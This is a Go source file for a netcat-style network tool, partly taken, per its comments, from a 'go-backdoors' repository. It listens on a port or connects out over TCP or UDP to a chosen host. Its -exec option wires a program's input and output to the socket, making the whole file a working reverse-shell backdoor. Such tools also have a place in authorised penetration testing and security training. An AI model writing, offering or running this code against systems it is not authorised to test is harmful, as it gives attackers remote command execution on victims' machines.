// https://github.com/LukeDSchenk/go-backdoors/blob/master/revshell.go
// https://github.com/dddpaul/gonc/blob/master/tcp/tcp.go

package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

type ProgressTCP struct {
	bytes uint64
}

type ProgressUDP struct {
	remoteAddr net.Addr
	bytes      uint64
}

func main() {
	var proto, host, command string
	var port int
	var listen bool

	flag.StringVar(&host, "host", "", "host to connect to")
	flag.IntVar(&port, "port", 4444, "port to connect to")
	flag.StringVar(&command, "exec", "", "command to execute")
	flag.BoolVar(&listen, "listen", false, "listen for incoming connections")
	flag.StringVar(&proto, "proto", "tcp", "protocol to use")

	flag.Parse()

	if port < 1 || port > 65535 {
		log.Fatalln("Invalid port number")
		os.Exit(1)
	}

	switch proto {
	case "tcp":
		if listen && command == "" && host == "" {
			TCPStartServer(proto, port)
		} else if host != "" {
			TCPStartRevShell(proto, host, port, command)
		} else {
			flag.Usage()
		}
	case "udp":
		if listen && command == "" && host == "" {
			UDPStartServer(proto, port)
		} else if host != "" {
			UDPStartRevShell(proto, host, port, command)
		} else {
			flag.Usage()
		}
	default:
		flag.Usage()
	}

}

func createShell(connection net.Conn, command string) {
	message := "successful connection from " + connection.LocalAddr().String()
	_, err := connection.Write([]byte(message + "\n"))
	if err != nil {
		log.Println("An error occurred trying to write to the outbound connection:", err)
		os.Exit(2)
	}

	cmd := exec.Command(command)
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	cmd.Run()
}

// ----------------- TCP -----------------

func TCPStartServer(proto string, port int) {
	ln, err := net.Listen(proto, fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Listening on", fmt.Sprintf("%s:%d", proto, port))
	con, err := ln.Accept()
	if err != nil {
		log.Fatalln(err)
	}
	log.Printf("[%s]: Connection has been opened\n", con.RemoteAddr())
	TCPTransferStreams(con)
}

func TCPStartRevShell(proto string, host string, port int, command string) {
	connection, err := net.Dial(proto, fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		log.Println("An error occurred trying to connect to the target:", err)
		os.Exit(1)
	}

	log.Println("Successfully connected to the target")

	if command != "" {
		createShell(connection, command)
	} else {
		TCPTransferStreams(connection)
	}
}

func TCPTransferStreams(con net.Conn) {
	c := make(chan ProgressTCP)

	// Read from Reader and write to Writer until EOF
	copy := func(r io.ReadCloser, w io.WriteCloser) {
		defer func() {
			r.Close()
			w.Close()
		}()
		n, err := io.Copy(w, r)
		if err != nil {
			log.Printf("[%s]: ERROR: %s\n", con.RemoteAddr(), err)
		}
		c <- ProgressTCP{bytes: uint64(n)}
	}

	go copy(con, os.Stdout)
	go copy(os.Stdin, con)

	p := <-c
	log.Printf("[%s]: Connection has been closed by remote peer, %d bytes has been received\n", con.RemoteAddr(), p.bytes)
	p = <-c
	log.Printf("[%s]: Local peer has been stopped, %d bytes has been sent\n", con.RemoteAddr(), p.bytes)
}

// ----------------- UDP -----------------

const (
	// BufferLimit specifies buffer size that is sufficient to handle full-size UDP datagram or TCP segment in one step
	BufferLimit = 2<<16 - 1
	// DisconnectSequence is used to disconnect UDP sessions
	DisconnectSequence = "~."
)

// TransferPackets launches receive goroutine first, wait for address from it (if needed), launches send goroutine then
func UDPTransferPackets(con net.Conn) {
	c := make(chan ProgressUDP)

	// Read from Reader and write to Writer until EOF.
	// ra is an address to whom packets must be sent in listen mode.
	copy := func(r io.ReadCloser, w io.WriteCloser, ra net.Addr) {
		defer func() {
			r.Close()
			w.Close()
		}()

		buf := make([]byte, BufferLimit)
		bytes := uint64(0)
		var n int
		var err error
		var addr net.Addr

		for {
			// Read
			if con, ok := r.(*net.UDPConn); ok {
				n, addr, err = con.ReadFrom(buf)
				// In listen mode remote address is unknown until read from connection.
				// So we must inform caller function with received remote address.
				if con.RemoteAddr() == nil && ra == nil {
					ra = addr
					c <- ProgressUDP{remoteAddr: ra}
				}
			} else {
				n, err = r.Read(buf)
			}
			if err != nil {
				if err != io.EOF {
					log.Printf("[%s]: ERROR: %s\n", ra, err)
				}
				break
			}
			if string(buf[0:n-1]) == DisconnectSequence {
				break
			}

			// Write
			if con, ok := w.(*net.UDPConn); ok && con.RemoteAddr() == nil {
				// Connection remote address must be nil otherwise "WriteTo with pre-connected connection" will be thrown
				n, err = con.WriteTo(buf[0:n], ra)
			} else {
				n, err = w.Write(buf[0:n])
			}
			if err != nil {
				log.Printf("[%s]: ERROR: %s\n", ra, err)
				break
			}
			bytes += uint64(n)
		}
		c <- ProgressUDP{bytes: bytes}
	}

	ra := con.RemoteAddr()
	go copy(con, os.Stdout, ra)
	// If connection hasn't got remote address then wait for it from receiver goroutine
	if ra == nil {
		p := <-c
		ra = p.remoteAddr
		log.Printf("[%s]: Datagram has been received\n", ra)
	}
	go copy(os.Stdin, con, ra)

	p := <-c
	log.Printf("[%s]: Connection has been closed, %d bytes has been received\n", ra, p.bytes)
	p = <-c
	log.Printf("[%s]: Local peer has been stopped, %d bytes has been sent\n", ra, p.bytes)
}

func UDPStartServer(proto string, port int) {
	addr, err := net.ResolveUDPAddr(proto, fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatalln(err)
	}
	con, err := net.ListenUDP(proto, addr)
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Listening on", fmt.Sprintf("%s:%d", proto, port))
	UDPTransferPackets(con)
}

func UDPStartRevShell(proto string, host string, port int, command string) {
	addr, err := net.ResolveUDPAddr(proto, fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		log.Fatalln(err)
	}
	con, err := net.DialUDP(proto, nil, addr)
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Sending datagrams to", fmt.Sprintf("%s:%d", host, port))

	if command != "" {
		createShell(con, command)
	} else {
		UDPTransferPackets(con)
	}
}
